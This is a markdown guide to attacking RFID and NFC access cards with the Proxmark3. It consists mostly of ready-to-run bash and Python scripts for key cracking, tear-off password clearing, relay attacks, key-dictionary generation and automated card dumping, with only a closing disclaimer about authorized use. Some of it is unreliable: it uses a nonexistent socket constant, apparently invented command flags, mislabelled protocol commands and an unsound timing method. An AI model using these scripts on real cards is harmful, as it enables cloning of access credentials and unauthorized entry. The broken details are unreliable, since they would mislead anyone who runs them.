# Advanced Attack Techniques for Proxmark3

## Table of Contents
1. [Side-Channel Attacks](#side-channel-attacks)
2. [Timing Attacks](#timing-attacks)
3. [Tear-off Attacks](#tear-off-attacks)
4. [Relay Attacks](#relay-attacks)
5. [Downgrade Attacks](#downgrade-attacks)
6. [Fault Injection](#fault-injection)
7. [Advanced MIFARE Attacks](#advanced-mifare-attacks)
8. [Custom Attack Scripts](#custom-attack-scripts)

---

## Side-Channel Attacks

### Power Analysis Attacks
```bash
# Enable high debug level for power monitoring
hw dbg -l 4

# Monitor power consumption during crypto operations
hf 14a raw -a -p -c A000000000  # Authentication command
# Analyze timing variations in response

# Look for power consumption patterns
trace list -t 14a
trace save -f power_analysis.trace
```

### Electromagnetic Analysis
```bash
# Use external antenna for EM monitoring
hw antenna external

# Monitor EM emissions during operations
hf mf auth 1 A FFFFFFFFFFFF
# Capture EM signatures during authentication

# Analyze EM patterns for key recovery
```

### Timing Analysis
```bash
# Measure response times for different operations
for key in FFFFFFFFFFFF 000000000000 A0A1A2A3A4A5; do
    echo "Testing key: $key"
    time pm3 -c "hf mf auth 1 A $key"
done

# Look for timing differences that indicate correct vs incorrect keys
```

---

## Timing Attacks

### MIFARE Classic Timing Attack
```bash
# Precise timing measurement for nested attack optimization
hf mf nested 1 0 A FFFFFFFFFFFF d --timing

# Use timing information to optimize attack parameters
hf mf hardnested 0 A FFFFFFFFFFFF 4 A --timing-attack
```

### Authentication Timing Analysis
```python
#!/usr/bin/env python3
# timing_attack.py - Timing-based key recovery

import subprocess
import time
import statistics

def measure_auth_time(sector, key_type, key):
    """Measure authentication time for given key"""
    start_time = time.time()
    result = subprocess.run(['pm3', '-c', f'hf mf auth {sector} {key_type} {key}'], 
                          capture_output=True, text=True)
    end_time = time.time()
    
    return end_time - start_time, "success" in result.stdout.lower()

def timing_attack(sector, key_type):
    """Perform timing attack on MIFARE sector"""
    common_keys = [
        "FFFFFFFFFFFF", "000000000000", "A0A1A2A3A4A5",
        "D3F7D3F7D3F7", "AABBCCDDEEFF", "123456789ABC"
    ]
    
    timing_results = []
    
    for key in common_keys:
        times = []
        success_count = 0
        
        # Multiple measurements for accuracy
        for _ in range(5):
            auth_time, success = measure_auth_time(sector, key_type, key)
            times.append(auth_time)
            if success:
                success_count += 1
        
        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0
        
        timing_results.append({
            'key': key,
            'avg_time': avg_time,
            'std_dev': std_dev,
            'success_rate': success_count / 5
        })
        
        print(f"Key {key}: {avg_time:.4f}s ±{std_dev:.4f}s (success: {success_count}/5)")
    
    # Analyze results for timing anomalies
    times_only = [r['avg_time'] for r in timing_results]
    mean_time = statistics.mean(times_only)
    
    print(f"\nTiming Analysis:")
    print(f"Mean response time: {mean_time:.4f}s")
    
    for result in timing_results:
        deviation = abs(result['avg_time'] - mean_time)
        if deviation > 0.001:  # 1ms threshold
            print(f"ANOMALY: Key {result['key']} deviates by {deviation:.4f}s")

if __name__ == "__main__":
    timing_attack(1, 'A')
```

---

## Tear-off Attacks

### MIFARE Ultralight Tear-off
```bash
# Basic tear-off attack setup
hw tearoff --delay 2000  # 2 second delay

# Attempt to write to protected block during tear-off window
hf mfu wrbl -b 3 -d 00000000

# OTP tear-off for specific vulnerabilities
hf mfu otptear

# Automated tear-off with varying delays
for delay in $(seq 1000 100 3000); do
    echo "Testing delay: ${delay}ms"
    hw tearoff --delay $delay
    result=$(hf mfu wrbl -b 0 -d 04ECA16A)
    if echo "$result" | grep -q "success"; then
        echo "SUCCESS at delay: ${delay}ms"
        break
    fi
done
```

### EM4x05 Tear-off Unlock
```bash
# EM4x05 specific tear-off unlock
lf em 4x05_unlock

# Manual tear-off for EM4x05
hw tearoff --delay 1500
lf em 4x05_write 1 12345678

# Verify unlock success
lf em 4x05_info
```

### T55xx Tear-off Attack
```bash
# Dangerous raw mode for T55xx tear-off
lf t55xx dangerraw

# Tear-off during password write
hw tearoff --delay 1000
lf t55xx write 7 00000000  # Write to password block

# Verify if password was cleared
lf t55xx info
```

---

## Relay Attacks

### MIFARE Classic Relay Setup
```bash
# Setup relay mode (requires two PM3 devices)
# Device 1 (reader side):
hf 14a raw -a -p -c 5000  # Keep field active

# Device 2 (card side):
hf 14a sim t 1 u [target_uid]  # Simulate target card

# Relay communication between devices
# This requires custom firmware or external relay hardware
```

### NFC Relay Attack
```python
#!/usr/bin/env python3
# nfc_relay.py - NFC relay attack implementation

import socket
import threading
import subprocess

class NFCRelay:
    def __init__(self, reader_ip, card_ip):
        self.reader_ip = reader_ip
        self.card_ip = card_ip
        self.reader_socket = None
        self.card_socket = None
    
    def setup_reader_side(self):
        """Setup reader-side relay"""
        # Connect to reader
        self.reader_socket = socket.socket(socket.AF_INET, socket.SOCK_TCP)
        self.reader_socket.connect((self.reader_ip, 8080))
        
        # Start PM3 in relay mode
        subprocess.Popen(['pm3', '-c', 'hf 14a raw -a -p -k -c'])
    
    def setup_card_side(self):
        """Setup card-side relay"""
        # Connect to card
        self.card_socket = socket.socket(socket.AF_INET, socket.SOCK_TCP)
        self.card_socket.connect((self.card_ip, 8080))
        
        # Start PM3 simulation
        subprocess.Popen(['pm3', '-c', 'hf 14a sim t 1 u 04A1B2C3'])
    
    def relay_data(self):
        """Relay data between reader and card"""
        def reader_to_card():
            while True:
                data = self.reader_socket.recv(1024)
                if data:
                    self.card_socket.send(data)
        
        def card_to_reader():
            while True:
                data = self.card_socket.recv(1024)
                if data:
                    self.reader_socket.send(data)
        
        # Start relay threads
        threading.Thread(target=reader_to_card).start()
        threading.Thread(target=card_to_reader).start()

# Usage example (requires network setup)
# relay = NFCRelay('192.168.1.100', '192.168.1.101')
# relay.setup_reader_side()
# relay.setup_card_side()
# relay.relay_data()
```

---

## Downgrade Attacks

### MIFARE Plus Downgrade
```bash
# Attempt to downgrade MIFARE Plus to Classic mode
hf mfp info

# Try to authenticate in Classic mode
hf mf auth 1 A FFFFFFFFFFFF

# If successful, treat as MIFARE Classic
hf mf autopwn
```

### DESFire Downgrade Attack
```bash
# Try legacy protocol on DESFire
hf mfdes info --legacy

# Attempt older authentication methods
hf mfdes auth -n 0 -t DES -k 0000000000000000

# Test for protocol downgrade vulnerabilities
hf 14a raw -a -p -c 0A00  # Legacy select
```

### ISO14443 Protocol Downgrade
```bash
# Force ISO14443-A Type A protocol
hf 14a raw -a -p -c 9320

# Try different protocol versions
hf 14a raw -a -p -c 9300  # ISO14443-3
hf 14a raw -a -p -c 9310  # ISO14443-4
```

---

## Fault Injection

### Voltage Glitching
```bash
# Prepare for voltage glitch attack
hw dbg -l 4

# Monitor power consumption
hw status

# Attempt glitch during authentication
# (Requires hardware modification)
hf mf auth 1 A FFFFFFFFFFFF
```

### Clock Glitching
```bash
# Modify clock frequency for fault injection
# (Requires custom firmware)

# Monitor for fault conditions
trace list -t 14a

# Look for authentication bypasses due to faults
```

---

## Advanced MIFARE Attacks

### Nested Attack Optimization
```bash
# Advanced nested attack with custom parameters
hf mf nested 1 0 A FFFFFFFFFFFF d --slow --tests 50

# Use multiple known keys for faster nested
hf mf nested 1 0 A FFFFFFFFFFFF 1 1 A D3F7D3F7D3F7 d
```

### Hardnested Attack Tuning
```bash
# Hardnested with maximum threads
hf mf hardnested 0 A FFFFFFFFFFFF 4 A --threads 8

# Hardnested with custom table
hf mf hardnested 0 A FFFFFFFFFFFF 4 A --table custom_table.bin

# Hardnested with specific tests
hf mf hardnested 0 A FFFFFFFFFFFF 4 A --tests 100
```

### Custom Dictionary Generation
```python
#!/usr/bin/env python3
# generate_custom_dict.py - Generate custom key dictionaries

import hashlib
import itertools

def generate_uid_based_keys(uid):
    """Generate keys based on UID patterns"""
    keys = []
    
    # Common UID-based algorithms
    # Algorithm 1: UID repeated
    keys.append(uid + uid[:4])
    
    # Algorithm 2: UID XOR patterns
    uid_bytes = bytes.fromhex(uid)
    xor_key = bytes([b ^ 0xFF for b in uid_bytes])
    keys.append(xor_key.hex().upper())
    
    # Algorithm 3: UID + checksum
    checksum = sum(uid_bytes) & 0xFF
    keys.append(uid + f"{checksum:02X}" * 2)
    
    return keys

def generate_facility_keys(facility_code):
    """Generate keys based on facility codes"""
    keys = []
    
    # Common facility-based patterns
    for i in range(10):
        key = f"{facility_code:04X}" + f"{i:04X}" + "0000"
        keys.append(key)
    
    return keys

def generate_date_keys():
    """Generate keys based on common dates"""
    keys = []
    
    # Common date patterns
    years = range(2000, 2025)
    months = range(1, 13)
    
    for year in years:
        for month in months:
            # YYYYMM pattern
            date_key = f"{year:04d}{month:02d}000000"
            keys.append(date_key)
    
    return keys

def save_dictionary(keys, filename):
    """Save keys to dictionary file"""
    with open(filename, 'w') as f:
        for key in keys:
            f.write(key + '\n')

if __name__ == "__main__":
    # Generate custom dictionary
    all_keys = []
    
    # Add UID-based keys for common UIDs
    common_uids = ["04A1B2C3", "04ECA16A", "12345678"]
    for uid in common_uids:
        all_keys.extend(generate_uid_based_keys(uid))
    
    # Add facility-based keys
    all_keys.extend(generate_facility_keys(123))
    
    # Add date-based keys
    all_keys.extend(generate_date_keys())
    
    # Remove duplicates and save
    unique_keys = list(set(all_keys))
    save_dictionary(unique_keys, "custom_keys.dic")
    
    print(f"Generated {len(unique_keys)} unique keys")
```

---

## Custom Attack Scripts

### Multi-Vector Attack Script
```bash
#!/bin/bash
# multi_vector_attack.sh - Comprehensive attack script

CARD_UID=""
CARD_TYPE=""
ATTACK_LOG="attack_$(date +%Y%m%d_%H%M%S).log"

echo "=== Multi-Vector Attack Script ===" | tee -a "$ATTACK_LOG"

# Phase 1: Detection and Analysis
echo "Phase 1: Card Detection" | tee -a "$ATTACK_LOG"
detection_result=$(pm3 -c "auto" 2>&1)
echo "$detection_result" | tee -a "$ATTACK_LOG"

# Extract card info
CARD_UID=$(echo "$detection_result" | grep -oP "UID.*:\s*\K[A-F0-9\s]+" | tr -d ' ')
CARD_TYPE=$(echo "$detection_result" | grep -oP "(MIFARE Classic|MIFARE Ultralight|DESFire|EM410x)")

echo "Detected: $CARD_TYPE with UID: $CARD_UID" | tee -a "$ATTACK_LOG"

# Phase 2: Attack Vector Selection
echo "Phase 2: Attack Vector Selection" | tee -a "$ATTACK_LOG"

case "$CARD_TYPE" in
    "MIFARE Classic")
        echo "Executing MIFARE Classic attack vectors..." | tee -a "$ATTACK_LOG"
        
        # Vector 1: Dictionary attack
        echo "Vector 1: Dictionary attack" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mf chk *1 ? d" 2>&1 | tee -a "$ATTACK_LOG"
        
        # Vector 2: Darkside attack
        echo "Vector 2: Darkside attack" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mf darkside" 2>&1 | tee -a "$ATTACK_LOG"
        
        # Vector 3: Hardnested attack
        echo "Vector 3: Hardnested attack" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mf hardnested 0 A FFFFFFFFFFFF 4 A" 2>&1 | tee -a "$ATTACK_LOG"
        
        # Vector 4: Autopwn
        echo "Vector 4: Autopwn" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mf autopwn" 2>&1 | tee -a "$ATTACK_LOG"
        ;;
        
    "MIFARE Ultralight")
        echo "Executing MIFARE Ultralight attack vectors..." | tee -a "$ATTACK_LOG"
        
        # Vector 1: Default passwords
        echo "Vector 1: Default passwords" | tee -a "$ATTACK_LOG"
        for pwd in FFFFFFFF 00000000; do
            pm3 -c "hf mfu dump -k $pwd" 2>&1 | tee -a "$ATTACK_LOG"
        done
        
        # Vector 2: UID-based password generation
        echo "Vector 2: UID-based passwords" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mfu pwdgen -r" 2>&1 | tee -a "$ATTACK_LOG"
        
        # Vector 3: Tear-off attack
        echo "Vector 3: Tear-off attack" | tee -a "$ATTACK_LOG"
        pm3 -c "hf mfu otptear" 2>&1 | tee -a "$ATTACK_LOG"
        ;;
esac

# Phase 3: Results Analysis
echo "Phase 3: Results Analysis" | tee -a "$ATTACK_LOG"

if grep -q "keys found" "$ATTACK_LOG"; then
    echo "SUCCESS: Keys recovered!" | tee -a "$ATTACK_LOG"
    echo "Proceeding with dump..." | tee -a "$ATTACK_LOG"
    pm3 -c "hf mf dump" 2>&1 | tee -a "$ATTACK_LOG"
elif grep -q "dump completed" "$ATTACK_LOG"; then
    echo "SUCCESS: Card dumped!" | tee -a "$ATTACK_LOG"
else
    echo "PARTIAL: Some attacks may have failed" | tee -a "$ATTACK_LOG"
fi

echo "Attack complete. Check $ATTACK_LOG for details."
```

---

## Performance Optimization

### Parallel Attack Execution
```python
#!/usr/bin/env python3
# parallel_attacks.py - Execute multiple attacks in parallel

import subprocess
import threading
import queue
import time

class ParallelAttacker:
    def __init__(self, max_threads=4):
        self.max_threads = max_threads
        self.results_queue = queue.Queue()
        
    def execute_attack(self, attack_name, command):
        """Execute single attack command"""
        try:
            start_time = time.time()
            result = subprocess.run(['pm3', '-c', command], 
                                  capture_output=True, text=True, timeout=300)
            end_time = time.time()
            
            self.results_queue.put({
                'attack': attack_name,
                'command': command,
                'output': result.stdout,
                'error': result.stderr,
                'duration': end_time - start_time,
                'success': result.returncode == 0
            })
        except subprocess.TimeoutExpired:
            self.results_queue.put({
                'attack': attack_name,
                'command': command,
                'output': '',
                'error': 'TIMEOUT',
                'duration': 300,
                'success': False
            })
    
    def run_parallel_attacks(self, attacks):
        """Run multiple attacks in parallel"""
        threads = []
        
        for attack_name, command in attacks.items():
            thread = threading.Thread(target=self.execute_attack, 
                                     args=(attack_name, command))
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(threads) >= self.max_threads:
                for t in threads:
                    t.join()
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join()
        
        # Collect results
        results = []
        while not self.results_queue.empty():
            results.append(self.results_queue.get())
        
        return results

# Usage example
if __name__ == "__main__":
    attacker = ParallelAttacker(max_threads=3)
    
    # Define attacks to run in parallel
    mifare_attacks = {
        'dictionary': 'hf mf chk *1 ? d',
        'darkside': 'hf mf darkside',
        'nested': 'hf mf nested 1 0 A FFFFFFFFFFFF d'
    }
    
    print("Running parallel attacks...")
    results = attacker.run_parallel_attacks(mifare_attacks)
    
    # Analyze results
    for result in results:
        print(f"\nAttack: {result['attack']}")
        print(f"Duration: {result['duration']:.2f}s")
        print(f"Success: {result['success']}")
        if result['success'] and 'key' in result['output'].lower():
            print("KEY FOUND!")
```

---

**Note**: These advanced techniques should only be used for authorized security testing and research purposes. Many of these attacks can potentially damage cards or violate local laws if used without proper authorization.
